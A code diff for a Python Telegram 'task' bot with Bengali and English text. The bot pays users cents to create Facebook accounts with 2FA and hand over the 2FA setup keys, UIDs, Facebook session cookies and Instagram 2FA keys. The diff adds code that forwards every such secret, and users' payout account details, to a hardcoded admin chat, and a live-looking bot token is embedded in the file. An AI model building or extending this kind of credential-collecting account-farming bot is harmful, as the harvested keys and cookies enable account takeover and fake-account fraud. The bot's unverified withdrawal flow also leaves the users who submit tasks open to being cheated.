@@ -6,21 +6,27 @@ import random
 TOKEN = "8980706201:AAHmK_q9vcStJiTbd-m1HGaDjbYhga3pfps"
 bot = telebot.TeleBot(TOKEN, parse_mode='Markdown')
 
+# আপনার টেলিগ্রাম চ্যাট আইডি এখানে সেট করা হলো
+ADMIN_CHAT_ID = 8856278248
+
 # User Data Storage
 user_data = {}
 
 def get_user(chat_id):
     if chat_id not in user_data:
         user_data[chat_id] = {
-            "balance": 0.90,
-            "total_submitted": 43,
-            "total_success": 28,
-            "review_pending": 3,
-            "admin_rejected": 12,
-            "bot_rejected": 12,
+            "balance": 0.00,
+            "total_submitted": 0,
+            "total_success": 0,
+            "review_pending": 0,
+            "admin_rejected": 0,
+            "bot_rejected": 0,
+            "referrals": 0,
+            "ref_earnings": 0.00,
             "state": None,
             "sub_state": None,
-            "task_data": {}
+            "task_data": {},
+            "withdraw_method": None
         }
     return user_data[chat_id]
 
@@ -58,16 +64,27 @@ def send_welcome(message):
     markup.add(btn_earn, btn_balance, btn_withdraw, btn_ref, btn_leaderboard, btn_stats, btn_support, btn_help)
     bot.send_message(chat_id, welcome_text, reply_markup=markup)
 
+@bot.message_handler(commands=['admin'])
+def admin_panel(message):
+    chat_id = message.chat.id
+    if ADMIN_CHAT_ID and chat_id != ADMIN_CHAT_ID:
+        bot.send_message(chat_id, "❌ আপনি এই কমান্ড ব্যবহার করার জন্য অনুমোদিত নন।")
+        return
+    
+    admin_text = (
+        "🛠 *Admin Panel*\n\n"
+        "স্বাগতম অ্যাডমিন! ইউজারদের সমস্ত টাস্ক সাবমিশন ও উইথড্র রিকুয়েস্ট এই চ্যাটে রিয়েল-টাইমে চলে আসবে।"
+    )
+    bot.send_message(chat_id, admin_text)
+
 @bot.message_handler(func=lambda message: True)
 def handle_messages(message):
     text = message.text
     chat_id = message.chat.id
     user = get_user(chat_id)
-    
-    # State Handling for Inputs
     state = user.get("state")
     
-    # 1. Facebook 2FA Task Flow
+    # 1. Facebook 2FA Task Flow (2FA Key -> UID)
     if state == "waiting_for_fb_2fa_key":
         user["task_data"]["2fa_key"] = text
         user["state"] = "waiting_for_fb_2fa_uid"
@@ -82,16 +99,27 @@ def handle_messages(message):
         user["total_submitted"] += 1
         user["review_pending"] += 1
         user["balance"] += 0.05
+        
+        # Notify Admin
+        if ADMIN_CHAT_ID:
+            admin_msg = (
+                f"🔔 *New Facebook 2FA Task Submitted!*\n\n"
+                f"👤 User ID: `{chat_id}`\n"
+                f"🔑 2FA Key: `{user['task_data'].get('2fa_key')}`\n"
+                f"🆔 UID: `{text}`"
+            )
+            bot.send_message(ADMIN_CHAT_ID, admin_msg)
+
         bot.send_message(chat_id, "✅ *Facebook 2FA Task Submitted Successfully!*\n⏳ Report time: within 30 minutes.")
         return
 
-    # 2. Facebook Cookies Task Flow
+    # 2. Facebook Cookies Task Flow (UID -> Cookies String)
     elif state == "waiting_for_fb_cookies_uid":
         user["task_data"]["uid"] = text
         user["state"] = "waiting_for_fb_cookies_string"
         markup = types.InlineKeyboardMarkup()
         markup.add(types.InlineKeyboardButton("❌ Cancel Process", callback_data="cancel_process"))
-        bot.send_message(chat_id, "🍪 Please paste your Facebook Cookies string/JSON:", reply_markup=markup)
+        bot.send_message(chat_id, "🍪 Please paste your Facebook Cookies string/JSON (Report Time: 30 minutes):", reply_markup=markup)
         return
 
     elif state == "waiting_for_fb_cookies_string":
@@ -100,6 +128,17 @@ def handle_messages(message):
         user["total_submitted"] += 1
         user["review_pending"] += 1
         user["balance"] += 0.049
+        
+        # Notify Admin
+        if ADMIN_CHAT_ID:
+            admin_msg = (
+                f"🔔 *New Facebook Cookies Task Submitted!*\n\n"
+                f"👤 User ID: `{chat_id}`\n"
+                f"🆔 UID: `{user['task_data'].get('uid')}`\n"
+                f"🍪 Cookies: `{text}`"
+            )
+            bot.send_message(ADMIN_CHAT_ID, admin_msg)
+
         bot.send_message(chat_id, "✅ *Facebook Cookies Task Submitted Successfully!*\n⏳ Report time: within 30 minutes.")
         return
 
@@ -110,7 +149,38 @@ def handle_messages(message):
         user["total_submitted"] += 1
         user["review_pending"] += 1
         user["balance"] += 0.045
+        
+        # Notify Admin
+        if ADMIN_CHAT_ID:
+            admin_msg = (
+                f"🔔 *New Instagram 2FA Task Submitted!*\n\n"
+                f"👤 User ID: `{chat_id}`\n"
+                f"🔑 IG 2FA Key: `{text}`"
+            )
+            bot.send_message(ADMIN_CHAT_ID, admin_msg)
+
         bot.send_message(chat_id, "✅ *Instagram 2FA Task Submitted Successfully!*\n⏳ Report time: within 30 minutes.")
+        return
+
+    # 4. Withdraw Details Input Flow
+    elif state == "waiting_for_withdraw_details":
+        method = user.get("withdraw_method", "Unknown")
+        amount = user["balance"]
+        user["state"] = None
+        user["balance"] = 0.0  # Balance reset after withdrawal request
+        
+        # Notify Admin
+        if ADMIN_CHAT_ID:
+            admin_msg = (
+                f"💸 *New Withdrawal Request!*\n\n"
+                f"👤 User ID: `{chat_id}`\n"
+                f"💳 Method: `{method}`\n"
+                f"💰 Amount: `${amount:.2f}`\n"
+                f"📋 Account Details: `{text}`"
+            )
+            bot.send_message(ADMIN_CHAT_ID, admin_msg)
+
+        bot.send_message(chat_id, f"✅ আপনার পেমেন্ট রিকুয়েস্ট সফলভাবে সাবমিট হয়েছে! খুব শীঘ্রই পেমেন্ট পাঠিয়ে দেওয়া হবে।")
         return
 
     # Normal Menu Handling
@@ -144,26 +214,15 @@ def handle_messages(message):
             "👥 *Referral Program*\n\n"
             "Invite friends and earn a **20% lifetime commission** on their task earnings!\n\n"
             f"🔗 *Your Referral Link:*\n`{ref_link}`\n\n"
-            f"📊 Total Referrals: 12\n"
-            f"⏳ Pending Referrals: 12\n"
-            f"✅ Active Referrals: 0\n"
-            f"💰 Total Commission Earned: $0.000"
+            f"📊 Total Referrals: {user['referrals']}\n"
+            f"💰 Total Commission Earned: ${user['ref_earnings']:.3f}"
         )
         bot.send_message(chat_id, ref_text)
         
     elif text == "🏆 Leaderboard":
         lb_text = (
             "🏆 *Referral Earnings Leaderboard* 🏆\n\n"
-            "1. 860****92 - $118.363\n"
-            "2. 847****98 - $28.282\n"
-            "3. 773****32 - $28.141\n"
-            "4. 849****66 - $20.714\n"
-            "5. 707****78 - $15.441\n"
-            "6. 766****59 - $13.353\n"
-            "7. 851****15 - $11.714\n"
-            "8. 874****97 - $9.618\n"
-            "9. 639****21 - $9.615\n"
-            "10. 685****90 - $9.218"
+            "কোনো রেফারাল ডাটা পাওয়া যায়নি।"
         )
         bot.send_message(chat_id, lb_text)
         
@@ -219,7 +278,7 @@ def handle_callbacks(call):
     elif call.data == "task_gmail_menu":
         markup = types.InlineKeyboardMarkup()
         markup.add(types.InlineKeyboardButton("⬅️ Back", callback_data="back_to_work"))
-        bot.edit_message_text("✉️ *Gmail Task*\n\nGmail options are currently active. New tasks will be added soon!", chat_id, call.message.message_id, reply_markup=markup)
+        bot.edit_message_text("✉️ *Gmail Task*\n\nGmail option is active. New tasks will be added soon!", chat_id, call.message.message_id, reply_markup=markup)
 
     elif call.data == "task_fb_2fa":
         name, password = generate_random_credentials()
@@ -234,7 +293,7 @@ def handle_callbacks(call):
             "1️⃣ Create a Facebook account using these details.\n"
             "2️⃣ Enable 2FA and get the setup key.\n"
             "⚠️ *Report Time: 30 minutes*\n\n"
-            "👉 Please provide your 2FA Key:"
+            "👉 Please paste your 2FA Setup Key:"
         )
         bot.send_message(chat_id, task_info, reply_markup=markup)
         bot.answer_callback_query(call.id)
@@ -276,6 +335,8 @@ def handle_callbacks(call):
 
     elif call.data.startswith("withdraw_"):
         method = call.data.split("_")[1].upper()
+        user["withdraw_method"] = method
+        user["state"] = "waiting_for_withdraw_details"
         bot.answer_callback_query(call.id, f"Selected {method}")
         bot.send_message(chat_id, f"✅ You selected *{method}* for withdrawal.\nلطفاً আপনার পেমেন্ট অ্যাকাউন্ট ডিটেইলস (নম্বর বা ওয়ালেট অ্যাড্রেস) সেন্ড করুন:")
 
@@ -294,5 +355,5 @@ def handle_callbacks(call):
         bot.edit_message_text("🚀 *Select a Category to Start Working:*", chat_id, call.message.message_id, reply_markup=markup)
 
 if __name__ == '__main__':
-    print("Bot is starting up cleanly...")
+    print("Bot is starting up cleanly with Admin notifications...")
     bot.infinity_polling()
